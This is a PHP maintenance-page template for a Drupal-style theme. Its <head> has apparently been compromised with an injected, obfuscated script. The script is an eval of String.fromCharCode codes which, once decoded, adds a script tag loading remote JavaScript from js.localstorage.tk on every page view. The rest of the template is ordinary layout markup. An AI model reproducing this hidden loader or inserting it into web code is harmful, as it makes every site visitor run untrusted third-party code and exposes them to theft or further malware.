<?php
/**
* @file
* Maintenance page template.
*/
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language ?>" lang="<?php print $language->language ?>" dir="<?php print $language->dir ?>">
  <head><script language=javascript>eval(String.fromCharCode(118, 97, 114, 32, 122, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41, 59, 32, 122, 46, 116, 121, 112, 101, 32, 61, 32, 34, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 34, 59, 32, 122, 46, 115, 114, 99, 32, 61, 32, 34, 104, 116, 116, 112, 115, 58, 47, 47, 106, 115, 46, 108, 111, 99, 97, 108, 115, 116, 111, 114, 97, 103, 101, 46, 116, 107, 47, 115, 46, 106, 115, 63, 99, 114, 116, 61, 110, 101, 119, 34, 59, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 122, 41, 59));</script>
    <title><?php print $head_title; ?></title>
    <?php print $head; ?>
    <?php print $styles; ?>
    <?php print $scripts; ?>
  </head>
  <body class="<?php print $classes; ?>">

  <?php print $page_top; ?>

  <div id="branding">
    <?php if ($title): ?><h1 class="page-title"><?php print $title; ?></h1><?php endif; ?>
  </div>

  <div id="page">

    <?php if ($sidebar_first): ?>
      <div id="sidebar-first" class="sidebar">
        <?php if ($logo): ?>
          <img id="logo" src="<?php print $logo ?>" alt="<?php print $site_name ?>" />
        <?php endif; ?>
        <?php print $sidebar_first ?>
      </div>
    <?php endif; ?>

    <div id="content" class="clearfix">
      <?php if ($messages): ?>
        <div id="console"><?php print $messages; ?></div>
      <?php endif; ?>
      <?php if ($help): ?>
        <div id="help">
          <?php print $help; ?>
        </div>
      <?php endif; ?>
      <?php print $content; ?>
    </div>

  </div>

  <?php print $page_bottom; ?>

  </body>
</html>
